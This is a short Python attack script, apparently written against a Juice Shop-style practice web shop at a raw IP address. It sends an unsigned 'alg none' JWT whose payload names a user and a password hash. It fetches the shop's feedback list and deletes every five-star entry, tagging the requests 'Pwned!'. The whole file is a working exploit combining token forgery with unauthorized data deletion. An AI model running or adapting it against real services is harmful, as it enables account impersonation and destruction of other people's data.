import json

import requests

s = requests.session()
s.headers.update({
                     'Authorization': "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6NywiZW1haWwiOiJCdW1ibGViZWVNYW5Aa3dpa2UubWFydCIsInBhc3N3b3JkIjoiN2M2YTE4MGIzNjg5NmEwYThjMDI3ODdlZWFmYjBlNGMiLCJjcmVhdGVkQXQiOiIyMDE4LTA2LTIyVDIyOjAyOjUwLjQyM1oiLCJ1cGRhdGVkQXQiOiIyMDE4LTA2LTIyVDIyOjAyOjUwLjQyM1oifSwiaWF0IjoxNTMwODQ3NTgyLCJleHAiOjE1MzA4NjU1ODJ9."})
json_r = json.loads(s.get("http://43.241.202.47:3003/api/Feedbacks/").text)

print(json_r)

for feedback in json_r['data']:
    if feedback['rating'] == 5:
        print(feedback)
        r = s.delete(
            "http://43.241.202.47:3003/api/Feedbacks/" + str(feedback['id']),
            headers={'Content-type': 'application/json'},
            data=json.dumps({
                "comment": "Pwned!",
                "rating": 1,
            }))
        print(r.status_code, r.text)
